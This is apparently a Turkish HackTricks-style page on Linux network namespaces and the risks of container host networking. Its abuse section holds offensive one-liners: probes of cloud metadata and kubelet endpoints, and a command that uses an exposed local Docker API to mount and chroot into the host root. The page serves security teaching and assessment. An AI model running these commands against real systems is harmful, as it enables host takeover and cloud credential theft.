# Ağ Namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Genel Bakış

Ağ namespace'i, arayüzler, IP adresleri, yönlendirme tabloları, ARP/komşu durumu, firewall kuralları, soketler ve `/proc/net` gibi dosyaların içeriği gibi ağla ilgili kaynakları izole eder. Bu yüzden bir container, host'un gerçek ağ yığınına sahip olmadan kendi `eth0`'ı, kendi yerel yönlendirmeleri ve kendi loopback cihazı varmış gibi görünebilir.

Güvenlik açısından bu önemlidir çünkü ağ izolasyonu port bağlamaktan çok daha fazlasıdır. Özel bir ağ namespace'i, iş yükünün doğrudan gözlemleyebileceği veya yeniden yapılandırabileceği şeyleri sınırlar. Bu namespace host ile paylaşıldığında, container uygulamanın görülmesi amaçlanmamış host dinleyicilerine, host-yerel servislere ve ağ kontrol noktalarına aniden görünürlük kazanabilir.

## İşleyiş

Yeni oluşturulmuş bir ağ namespace'i, arayüzler eklenene kadar boş veya neredeyse boş bir ağ ortamı ile başlar. Container runtime'ları daha sonra sanal arayüzler oluşturur veya bağlar, adres atar ve iş yükünün beklenen bağlantıya sahip olması için yönlendirmeleri yapılandırır. Bridge tabanlı dağıtımlarda bu genellikle container'ın host bridge'e bağlı veth-backed bir arayüz görmesi anlamına gelir. Kubernetes'te CNI eklentileri Pod ağının eşdeğer yapılandırmasını gerçekleştirir.

Bu mimari, `--network=host` veya `hostNetwork: true`'nin neden bu kadar dramatik bir değişiklik olduğunu açıklar. Hazır bir özel ağ yığını almak yerine, iş yükü host'un gerçek ağ yığınına katılır.

## Laboratuvar

Neredeyse boş bir ağ namespace'ini şu şekilde görebilirsiniz:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
Ve normal konteynerleri host-networked konteynerlerle şöyle karşılaştırabilirsiniz:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Host-networked container artık kendi izole socket ve interface görünümüne sahip değildir. Bu değişiklik, sürecin hangi yeteneklere sahip olduğunu sorgulamadan önce bile önemlidir.

## Çalışma Zamanı Kullanımı

Docker ve Podman normalde aksi yapılandırılmadıkça her container için özel bir network namespace oluşturur. Kubernetes genellikle her Pod'a kendi network namespace'ini verir; bu namespace, Pod içindeki container'lar tarafından paylaşılır ama host'tan ayrıdır. Incus/LXC sistemleri de network-namespace tabanlı zengin izolasyon sağlar, genellikle daha çeşitli virtual networking düzenlemeleriyle.

Ortak ilke, özel ağlamanın varsayılan izolasyon sınırı olmasıdır; host networking ise bu sınırdan açıkça vazgeçilmesidir (opt-out).

## Yanlış Yapılandırmalar

En önemli yanlış yapılandırma basitçe host network namespace'inin paylaşılmasıdır. Bu bazen performans, düşük seviyeli monitoring veya kullanım kolaylığı için yapılır, ancak container'lara sunulan en temiz sınırlardan birini kaldırır. Host-local listener'lar daha doğrudan erişilebilir hale gelebilir, localhost-only servisler erişilebilir olabilir ve `CAP_NET_ADMIN` veya `CAP_NET_RAW` gibi yetenekler, bu yeteneklerin etkinleştirdiği işlemler artık host'un kendi ağ ortamına uygulandığı için çok daha tehlikeli hale gelir.

Diğer bir sorun, network namespace özel olsa bile ağla ilgili yeteneklerin aşırı verilmesidir. Özel bir namespace yardımcı olur, ancak raw sockets veya gelişmiş ağ kontrolünü zararsız hale getirmez.

## Kötüye Kullanım

Zayıf izole edilmiş kurulumlarda saldırganlar host'taki dinleyen servisleri inceleyebilir, yalnızca loopback'e bağlı yönetim uç noktalarına erişebilir, tam yeteneklere ve ortama bağlı olarak trafiği sniff veya müdahale edebilir veya `CAP_NET_ADMIN` varsa yönlendirme ve firewall durumunu yeniden yapılandırabilir. Bir cluster içinde bu, lateral movement ve control-plane reconnaissance'ı da kolaylaştırabilir.

Eğer host networking'den şüpheleniyorsanız, görünür interface'lerin ve listener'ların izole bir container ağına değil host'a ait olduğunu doğrulayarak başlayın:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Yalnızca loopback üzerinde çalışan servisler genellikle ilk ilginç keşiflerdir:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Ağ yetenekleri mevcutsa, iş yükünün görünür stack'i inceleyip değiştirebildiğini test edin:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Küme veya bulut ortamlarında, host ağı ayrıca metadata ve control-plane'e bitişik servislerin hızlı yerel recon'unu haklı çıkarır:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
### Tam Örnek: Host Networking + Local Runtime / Kubelet Erişimi

Host networking otomatik olarak host root sağlamaz, ancak çoğu zaman yalnızca düğümün kendisinden erişilebilen servisleri açığa çıkarır. Bu servislerden biri zayıf korunuyorsa, host networking doğrudan bir privilege-escalation yolu haline gelir.

Docker API localhost üzerinde:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
localhost'taki Kubelet:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- uygun koruma olmadan yerel bir runtime API'si açığa çıkarsa doğrudan host ele geçirilebilir
- kubelet veya yerel agentlara erişilebiliyorsa küme keşfi veya yatay hareket
- `CAP_NET_ADMIN` ile birleştirildiğinde trafik manipülasyonu veya hizmet reddi

## Kontroller

Bu kontrollerin amacı, sürecin özel bir ağ yığınına sahip olup olmadığını, hangi rotaların ve dinleyicilerin görünür olduğunu ve ağ görünümünün yetenekleri test etmeden önce zaten host-benzeri görünüp görünmediğini öğrenmektir.
```bash
readlink /proc/self/ns/net   # Network namespace identifier
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
```
Burada ilginç olan:

- Eğer namespace kimliği veya görünen arayüz kümesi host'a benziyorsa, host networking zaten kullanımda olabilir.
- `ss -lntup` özellikle değerlidir çünkü yalnızca loopback dinleyicilerini ve yerel yönetim uç noktalarını ortaya çıkarır.
- Eğer `CAP_NET_ADMIN` veya `CAP_NET_RAW` mevcutsa, rotalar, arayüz isimleri ve güvenlik duvarı bağlamı çok daha önemli hale gelir.

Bir container'ı incelerken, network namespace'ini her zaman capability set ile birlikte değerlendirin. Host networking ile güçlü ağ yetkilerinin birlikte olması, bridge networking ile dar bir varsayılan yetki setinin birlikte olmasından çok farklı bir duruştur.
{{#include ../../../../../banners/hacktricks-training.md}}
